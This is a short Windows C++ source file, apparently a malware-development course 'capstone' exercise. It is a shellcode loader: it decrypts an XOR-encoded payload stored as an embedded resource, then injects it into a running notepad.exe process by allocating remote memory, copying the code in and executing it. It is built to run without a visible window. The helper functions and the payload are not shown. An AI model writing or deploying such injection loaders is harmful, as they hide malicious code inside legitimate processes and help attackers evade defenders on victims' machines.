#include <windows.h>
#include <stdio.h>
#include "../utils/resources.h"
#include "../utils/utility.h"

// g++ -m64 -mwindows -o .\capstone.exe .\capstone.cpp ..\utils\resources.o ..\utils\utility2.cpp
int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR pC, int nC){

//int main(int argc, char const *argv[]){

    HANDLE  processHandle;
    LPVOID  resAddr;
    LPVOID  remoteAddr;
    DWORD   resSize;
    DWORD   pid;
    UCHAR   key[] = KK;
    PUCHAR  decoded;

    // Load resource
    getResourceAddr(&resAddr, &resSize, RSC_XOR);
   
    // Decrypt xored data in the resource
    decoded = (PUCHAR)malloc(sizeof(UCHAR) * resSize);
    xorEncoding((PUCHAR)resAddr, resSize, key, sizeof(key), (PUCHAR)decoded);
    
    // Open remote process
    getProcessHandle("notepad.exe", &processHandle, &pid);

    // Load code in the remote process
    allocateAndCopyRemote(processHandle, &remoteAddr, (LPCVOID)decoded, resSize);

    // Execute code in the remote process
    allowAndExecuteRemote(processHandle, remoteAddr, resSize);

    return EXIT_SUCCESS;
}